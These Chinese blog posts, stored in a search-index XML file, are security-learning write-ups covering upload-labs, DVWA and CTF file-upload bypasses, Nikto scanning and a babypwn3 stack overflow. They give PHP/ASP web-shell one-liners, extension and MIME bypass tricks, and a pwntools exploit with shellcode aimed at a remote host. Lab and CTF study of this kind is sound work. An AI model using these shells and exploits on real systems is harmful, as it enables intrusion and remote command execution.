<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[upload-labs（1-5）]]></title>
    <url>%2F2018%2F07%2F11%2Fupload-labs%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt; 换了markdown写，再也不用担心排版丑了 #Pass-01:# ##Pass-01源码:## function checkFile() { var file = document.getElementsByName(&apos;upload_file&apos;)[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; } } 这个是js的代码，允许上传的类型是.jpg,.png,.gif的文件 提示： 客户端JS检测： 禁用js，上传.php文件(我用的是这个，因为懒) 先在本地改成符合的图片格式，然后抓包改回成.php文件 按F12打开查看器，找到上传的路径 #Pass-02：# ##Pass-02源码：## 1234567891011121314151617181920212223242526272829303132333435363738 $is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) &#123; //判断类型为.jpeg,.png,.gif if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123; //判断文件是否上传 $img_path = $UPLOAD_ADDR . $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $is_upload = true; &#125; &#125; else &#123; $msg = &apos;文件类型不正确，请重新上传！&apos;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR.&apos;文件夹不存在,请手工创建！&apos;; &#125; &#125; ``` **提示： **![](upload-labs/02.png)根据提示，**MIME检测**上传一个.php文件，然后抓包，然后将Content-Type的application/octet-stream改成image/jpeg或者image/png或者image/gif![](upload-labs/03.png)上传成功2018/7/8 22:59:41 # Pass-03： ### Pass-03源码： ## $is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists($UPLOAD_ADDR)) { $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;); //黑名单 $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); //trim() 函数移除字符串两侧的空白字符或其他预定义字符。 //如果省略，就移除&quot;\0&quot;、&quot;\t&quot;、&quot;\n&quot;、&quot;\x0B&quot;（垂直制表符）、&quot;\t&quot;、&quot;&quot;（空格） $file_name = deldot($file_name); //删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); //从文件名字符串中最后出现&apos;.&apos;的位置开始，到末尾，即获取后缀名 $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext); //去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { //不在黑名单中 if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR. &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = $UPLOAD_ADDR .&apos;/&apos;. $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; //上传路径为****/上传文件名 $is_upload = true; } } else { $msg = &apos;不允许上传.asp,.aspx,.php,.jsp后缀文件！&apos;; } } else { $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;; } } 12345678910111213141516171819**黑名单检测**检测的名单是&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;大小写，加空格绕过方式不行，可以用不在黑名单列表中的后缀名，例如：php5，php7等等；也可以用.htaccess重写文件解析规则绕过（htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。）**①利用不在黑名单中的后缀名绕过**上传一个内容为`&lt;?php @eval($_POST[&apos;a&apos;]); ?&gt;`，后缀名改成php5的文件，上传成功后连蚁剑：shell url：http://127.0.0.1/upload-labs/upload/eval03.php5shell pwd：a然后......**②.htaccess重写文件解析规则绕过：**1. 创建htaccess文件，编辑内容为： SetHandler application/x-httpd-php1234567891011122. 然后再上传eval03.jpg的木马, 这样eval03.jpg就可解析为php文件。![](upload-labs/05.png)3. 上传成功后，在蚁剑里shell url里写 http://127.0.0.1/upload-labs/upload/eval03.jpg，shell pwd里写 a，然后.......![](upload-labs/06.png) 2018/7/11 17:07:38 # Pass-04 ### Pass-04源码： ## $is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists($UPLOAD_ADDR)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = $UPLOAD_ADDR . $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $is_upload = true; } } else { $msg = &apos;此文件不允许上传!&apos;; } } else { $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;; } } 12345678**黑名单检测**检测的名单有很多，大小写，加空格绕过方式不行，将后缀名改成php5、php7等等也不行，可以用.htaccess重写文件解析规则绕过，如上题2018/7/11 18:37:02 # Pass-05 ### Pass-05源码： ## $is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists($UPLOAD_ADDR)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) { $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name; $is_upload = true; } } else { $msg = &apos;此文件不允许上传&apos;; } } else { $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;; } } ``` 黑名单检测这次检测没有大小写转化，因此可以将文件后缀名改成部分大写绕过 上传成功 蚁剑：shell url：http://127.0.0.1/upload-labs/upload/eval05.PhP shell pwd：a]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全牛学习笔记（一）扫描工具——NIKTO]]></title>
    <url>%2F2018%2F07%2F10%2F%E7%AC%94%E8%AE%B0%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7nikto%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt;emmmm这节课真的真的真的好长哇！ 扫描工具——NIKTO（Peri语言开发的开源web安全扫描器）扫描： ①web服务器的软件版本（IIS、Apache还是别别的） ②搜索存在安全隐患的文件（例如有些维护web服务器后留下的以日期命名的备份文件，就能得到目标网站的源代码） ③服务器配置漏洞（默认配置不是安全的设置） ④web application层面的安全隐患（xss，SQL注入等） ⑤避免404误判 例：很多服务器不遵守RFC标准，对于不存在的对象返回200 依据相应文件内容判断，不同扩展名的文件404相应内容不同（如jsp、cji） 去除时间信息后的内容取md5值参数：-no404（不进行误判尝试判断，可能存在误判，能提高速度） 常用命令：可以用man nikto来查看更多的信息①nikto -update（从CIRT.net这个网址去升级数据库和插件，使用之前还是先update一下比较好） ②nikto -list-plugins：查看各种插件类型（；例如auth、fileops、ssl、tests等等，提一点shellshock！）如果通过命令不行，那就去找这个网址：http://cirt.net/nikto/UPDATES，会有很多版本 ③nikto -host http://1.1.1.1 （后面的URL是扫描的目标，可以用靶机玩）nikto -host http://192.168.1.109/dvwa/（扫描192.168.1.109的dvwa目录） ④nikto -host 192.168.1.109 port 80,443（扫描端口，多个端口可以一起来指定）nikto -host 192.168.1.109 port 80（会用各种http的方式去连接，去检测端口） ⑤nikto -host www.baidu.com -port 443 -ssl（www.baidu.com是主机名，https默认的端口为443，-ssl：检测https）解析结果举例：(1)扫百度 Target IP：主机的ip Target Hostname：主机名 Target Port：端口 SSL Info：使用证书的相关信息 （Subject：证书的信息；Cipers：证书加密的方式等等。 robots.txt contains 103 entries which should be manually viewed：这句话大致讲：很需要查看一下这个robots.txt文件 (2)扫自己的靶机 1、X-XSS-Protection 响应头是Internet Explorer，Chrome和Safari的一个功能，当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面。例如： X-XSS-Protection: 0 禁止XSS过滤 X-XSS-Protection: 1 启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。 X-XSS-Protection: 1; mode=block 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。 X-XSS-Protection: 1; report= 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。2、X-Content-Type-Options 响应首部相当于一个提示标志，MIME类型嗅探3、Apache的版本为2.2.8，是过期的版本，当前至少应该是2.4.12版本4、HTTP TRACE method is active……. (‘Vulnerable’)TRACE请求方式：回显服务器收到的请求，主要用于测试或诊断，可用来进行跨站脚本（XSS）攻击，这种攻击方式又称为跨站跟踪攻击（XST）。5、/phpMyAdmin/changelog.php…….能知道后端数据库使用MySQL，可以有针对性的注入 ⑥nikto -host host.txt将需要扫描的多个网站的地址放在txt文档里，然后扫描txt文档中的格式：1. 192.168.60.90:80; 2. https://192.168.60.90:8443; 3. 192.168.60.90（默认扫描80端口） ⑦nmap -p80 192.168.1.0/24 -oG - | nikto -host – 结合nmap一起扫描，-oG指输出内容，第一个”-“表示输出的结果，再用|给nikto扫，第二个”-“表示nmap扫描出来的开放的端口的IP地址 ⑧nikto -host https://www.baidu.com -useproxy http://localhost:8087 用代理去扫描 ⑨当一个IP有两个主机时，需要用-vhost来查看nikto -vhost 域名 …还是可以加代理的 ⑩nikto interactive nikto 配置文件（/etc/nikto.conf） ①设置cookie：将cookie的值写进配置文件里，然后nikto -host http://192.168.1.109/dvwa/ ，再用d（debug）去查看cookie是否已经生效②-evasion：使用LibWhisker中对IDS的躲避技术，可使用以下几种类型： 随机URL编码（非UTF-8方式） 自选择路径（/./） 过早结束的URL 优先考虑长随机字符串 参数欺骗 使用TAB作为命令的分隔符 使用变化的URL 使用Windows路径分隔符“\”举例：nikto -host http://192.168.43.165/dvwa/ -evasion 167（采用逃避技术167来扫描192.168.43.165的dvwa目录）]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跟大佬学的文件上传绕过]]></title>
    <url>%2F2018%2F07%2F07%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt; 潘老师人美心善，炒鸡炒鸡耐心教我这个小白，特别感恩！ 一句话木马PHP： &lt;?php echo shell_exec($_GET[‘a’]);?&gt; &lt;?php @eval($_POST[‘a’]); ?&gt;ASP: &lt;%eval request(“Cknife”)%&gt;ASP.NET: &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt; 文件上传漏洞检测 1.客户端javascript检测（通常在本地检测文件的扩展名） 绕过： ①禁用js ②先把文件改成符合条件的文件格式上传，再在抓包，修改文件的后缀名 2.服务端检测绕过（MIME类型检测） 绕过： 可以通过burp拦包，将原Content-Type类型改成符合的类型。 3.服务端目录路径检测 绕过： 上传时提供存储路径为image/20160704/可以修改为image/20160704/evil.php%00来截断。 后端程序会将连接为image/20160704/evil.php%00filename.gif00截断导致最终存储为evil.php 4.服务端文件扩展名检测 （1）黑名单检测：接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传 绕过： ①后缀名大小写绕过 ,例如:将Burpsuite截获的数据包中的文件名evil.php改evil.Php ②名单列表绕过，尝试使用非黑名单内的后缀名，如php5，php7等 ③特殊文件名绕过（只适用windows，将文件名改为evil.php.或 evil.php (注意这里有一个空格)。 在windows下，不允许这样的命名，所以会将.和空格自动去掉）。 ④0x00截断绕过：在上传的时候，当文件系统读到0x00时，会认为文件已经结束。 例如：1.php%00.jpg，验证扩展名是.jpg，但写入的时候是1.php文件。 （2）白名单检测：接收上传的文件做扩展名匹配，匹配上白名单中的扩展名才能上传 绕过： ①0x00截断绕过 ②解析漏洞绕过 apache解析文件名是从右到左识别扩展名，如eval.php.jpg，文件为php文件，不能解析jpg会向前解析php IIS6.0 目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析。 IIS6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型 Nginx解析漏洞：将php文件换成其他可以通过的文件后缀，访问的时候在后面加上/.php， 例如：evil.jpg/.php，evil.jpg会解析为php的格式 5.服务端文件内容检测 图像类的文件内容检测 文件幻数检测（图片头格式检测） jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46 gif内容头value= 47 49 46 38 39 61 png内容头value= 89 50 4E 47 绕过：在文件头后加上一句话木马就能绕过 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596//基于MIME&lt;?php if (isset($_POST[&apos;Upload&apos;])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;; $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]); $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;]; $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type’]; //得到上传文件名的类型，kali里可以用mimetype 文件名来查看 //例如：mimetype 1.php 9527.php: application/x-php(php类型) //尽管后缀名改了还是能识别真正的类型（根据内容来检测） $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; //得到文件的大小 if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123; //这里做文件类型和文件大小的比较 //文件大小被规定为100000KB，因此参照LOW抓包改文件最大值不能绕过 if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path))&#123; echo &apos;&lt;pre&gt;&apos;; echo &apos;Your image was not uploaded.&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; else &#123; echo &apos;&lt;pre&gt;&apos;; echo $target_path . &apos; succesfully uploaded!&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; &#125; else&#123; echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; &#125; &#125; ?&gt;//基于黑名单&lt;?php $BlackList = array(&apos;asp&apos;,&apos;php&apos;,&apos;jsp&apos;,&apos;php5&apos;,&apos;asa&apos;,&apos;aspx’); //黑名单 if (isset($_POST[&quot;submit&quot;]))&#123; $name = $_FILES[&apos;file&apos;][&apos;name&apos;]; //接收文件名 echo $name; $extension = substr(strrchr($name,&quot;.&quot;),1); //得到扩展名 $boo = false; foreach ($BlackList as $key=&gt;$value)&#123; //foreach()函数的意思是BlackList的键值赋值给value //相当于value=BlackList[i]，key=i(数组下标) if ($value==$extension)&#123; //迭代判断是否有命中 $boo=true; break;//命中之后直接退出循环 &#125; &#125; if(!$boo)&#123; //如果没有命中，则开始文件上传操作 $size=$_FILES[&apos;file&apos;][&apos;size’]; //接收文件大小 $tmp=$_FILES[&apos;file&apos;][&apos;tmp_name’]; //临时路径 move_uploaded_file($tmp,$name); //移动临时文件到当前文件目录 echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name; &#125; else &#123; echo &quot;文件不合法！！&quot;; &#125; &#125;?&gt;///基于白名单&lt;?php $WhiteList=array(&apos;rar&apos;,&apos;jpg&apos;,&apos;png&apos;,&apos;bmp&apos;,&apos;gif&apos;,&apos;jpg&apos;,&apos;doc’); if (isset($_POST[&quot;submit&quot;]))&#123; $name = $_FILES[&apos;file&apos;][&apos;name’]; //接收文件名 $extension = substr(strrchr($name,&quot;.&quot;),1); //得到扩展名 $boo = false; foreach ($WhiteList as $key=&gt;$value)&#123; if ($value==$extension)&#123; //迭代判断是否有命中 $boo=true; &#125; &#125; if($boo)&#123; //如果有命中，则开始文件上传操作 $size=$_FILES[&apos;file&apos;][&apos;size’]; //接收文件大小 $tmp=$_FILES[&apos;file&apos;][&apos;tmp_name’]; //临时路径 move_uploaded_file($tmp,$name); //移动临时文件到当前文件目录 echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name; &#125; else &#123; echo &quot;文件不合法！！&quot;; &#125; &#125;?&gt;]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实验吧上传绕过]]></title>
    <url>%2F2018%2F07%2F07%2F%E5%AE%9E%E9%AA%8C%E5%90%A7%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt; 解题链接：http://ctf5.shiyanbar.com/web/upload/①因为没有说明上传文件的类型，因此先上传一个.png文件结果显示的页面说必须上传成后缀名为php的文件，还说了存储的路径./upload/②接着上传一个.php文件，结果显示仅支持上传jpg,gif,png文件这一题是先检测后缀名的，需要jpg的格式，但是存储的时候把名字给改了。最后的一句提示是需要上传成文件后缀名为php的，这个php格式的后缀名和检测的jpg格式矛盾了，用%00截断③还是上传php文件，然后抓包，把文件后缀名改成.php，还要%00截断然后在Repeater里面，在上传的路径的upload后加上相应的php文件名，在加几个空格做标记，在用hex查看标记，在第一个20改成00做截断返回到Repeater的Raw的页面，可以发现已经被截断了点GO以后可以看到flag flag：flag{SimCTF_huachuan}]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA文件上传]]></title>
    <url>%2F2018%2F07%2F07%2FDVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt; 上传的php文件内容：&lt;?php echo shell_exec($_GET[‘a’]);?&gt; LOW等级源码：12345678910111213141516171819&lt;?php if (isset($_POST[&apos;Upload&apos;])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;; //上传的路径为../../ hackable/uploads/ $target_path = $target_path . basename( $_FILES[&apos;uploaded&apos;][&apos;name&apos;]); //上传路径加上上传的文件名 if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123; //这里只做是否上传成功的判断，因此所有格式的文件都能上传 echo &apos;&lt;pre&gt;&apos;; echo &apos;Your image was not uploaded.&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; else &#123; echo &apos;&lt;pre&gt;&apos;; echo $target_path . &apos; succesfully uploaded!&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; &#125;?&gt; ①第一次上传图片时没有看源码，符合要求但是显示不能成功上传（可能存在的原因是图片文件太大） 抓包发现是因为超出了上传文件的最大内容解决：可以在抓到的头部把最大值改了，可以上传（在服务器端没有对文件大小做验证） ②通过看源码发现对上传文件格式没有任何限制，因此直接上传一个 .php文件上传成功后输入相应的url并写入参数.例如：192.168.1.208/dvwa/hackable/uploads/9527.php?a=pwd，可以查看所在目录 MEDIUM等级源码：123456789101112131415161718192021222324252627282930&lt;?php if (isset($_POST[&apos;Upload&apos;])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;; $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]); $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;]; $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type&apos;]; //得到上传文件名的类型，kali里可以用mimetype 文件名来查看 //例如：mimetype 1.php 9527.php: application/x-php(php类型) //尽管后缀名改了还是能识别真正的类型（根据内容来检测） $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; //得到文件的大小 if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123; //这里做文件类型和文件大小的比较 //文件大小被规定为100000KB，因此参照LOW抓包改文件最大值不能绕过 if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123; echo &apos;&lt;pre&gt;&apos;; echo &apos;Your image was not uploaded.&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; else &#123; echo &apos;&lt;pre&gt;&apos;; echo $target_path . &apos; succesfully uploaded!&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; &#125; else&#123; echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; &#125; &#125;?&gt; ①对于MIME类型的验证，可以通过抓包修改Content-type的值将Content-type的值application/x-php改成image/jpeg 显示上传成功 ②输入url并填入参数例如：输入url：192.168.1.208/dvwa/hackable/uploads/9527.php?a=ls查看当前文件夹下的文件 *常见的MIME类型 *可以用mimetype文件名来查看文件类型mimetype是用内容的前10个字节来判断文件类型，因此更改后缀名不能更改文件类型 HIGH等级源码：1234567891011121314151617181920212223242526272829&lt;?php if (isset($_POST[&apos;Upload&apos;])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;; $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]); $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;]; $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1); //读取文件上传的扩展名 $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123; //对读取的文件扩展名进行判断类型和文件大小判断 if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123; echo &apos;&lt;pre&gt;&apos;; echo &apos;Your image was not uploaded.&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; else &#123; echo &apos;&lt;pre&gt;&apos;; echo $target_path . &apos; succesfully uploaded!&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; &#125; else&#123; echo &apos;&lt;pre&gt;&apos;; echo &apos;Your image was not uploaded.&apos;; echo &apos;&lt;/pre&gt;&apos;; &#125; &#125; ?&gt; ①抓包，在后缀名后在添加上相应的图片后缀名，此处可以将9527.php改成9527.php.jpg 显示上传成功 ②输入相应的URL，并填入参数得到结果例如：输入url：192.168.1.208/dvwa/hackable/uploads/9527.php.jpg?a=pwd]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[babypwn3学习经历]]></title>
    <url>%2F2017%2F12%2F30%2Fbabypwn3%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt;一:查壳checksec babypwn3显示： 没有什么保护二：代码int vulFunc(){char buf; // [sp+0h] [bp-88h]@1char v2; // [sp+7Fh] [bp-9h]@1memset(&amp;buf, 0, 0x80u); //初始化buf的128个字节为0 ①puts(“寮勬淇轰亢涔熶笉浼氬惉浣犵殑璇濈殑锛乗n”);read(0, &amp;buf, 0x100u); //读取数据256个字节保存在buf中if ( v2 == 127 )JUMPOUT(CS, &amp;buf); //当v2=127时会去执行栈上的代码return puts(“鐣ョ暐鐣ワ綖\n”);}.text:080484A6 ; =============== S U B R O U T I N E =======================================.text:080484A6.text:080484A6 ; Attributes: bp-based frame.text:080484A6.text:080484A6 public vulFunc.text:080484A6 vulFunc proc near ; CODE XREF: main+46p.text:080484A6.text:080484A6 buf = byte ptr -88h.text:080484A6 var_9 = byte ptr -9.text:080484A6…….text:08048500 jmp esp三：需要一个shellcode能够system(“/bin/sh”)shellcode=”\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”; //感恩师傅，我可以偷懒1.shellcode+任意字符*(127-shellcode长度)+(v2=127)覆盖v2=127，需要用p32()打包from pwn importshellcode = “\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”;p=remote(‘121.42.189.18 ‘,7003)payload = shellcode+’a’(127-len(shellcode))+p32(127)p.recv()p.sendline(payload)raw_input()p.interactive()2.”jmp esp”作为跳板动态定位shellcode③因为当Eip在后续执行过程中，遇到了jmp esp指令，仍会回到esp指向的函数形参位置执行，执行shellcode的剩余部分。jmp sep地址=08048500 ，需要用p32()打包from pwn importshellcode = “\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”;p=remote(‘121.42.189.18 ‘,7003)jmp_esp=0x8048500payload = ‘a’140+p32(jmp_esp)+shellcodep.recv()p.sendline(payload)p.interactive()四：进入shell里cat /tmp/flag ⑤①memset() 函数常用于内存空间初始化void memset(void s,int c,size_t n)开辟的空间s的n个字符初始化为c②JumpOut (“Program” [, “Document”])program:指定的应用程序打开文件Document③可用”jmp esp”作为跳板动态定位shellcode1) 用内存中任意一个”jmp esp”的地址覆盖返回地址2) 函数返回后被重定向去执行内存中jmp esp指令3) 由于函数返回后ESP指向返回地址后，jmp esp执行后，CPU将到栈区函数返回地址之后的地方取指令执行4) shellcode的布置。缓冲区前面一段用任意数据填充，把shellcode放在函数返回地址后面。jmp esp执行完就执行shellcode。http://blog.csdn.net/lixiangminghate/article/details/53333710（栈的图画得非常好）http://blog.csdn.net/swjtu100/article/details/50032831（exploit画得很好看）栈指针esp的一个特性：当函数执行ret指令后，Eip寄存器发生了跳转，但Esp还指向函数形参在栈中的地址。当Eip在后续执行过程中，遇到了jmp 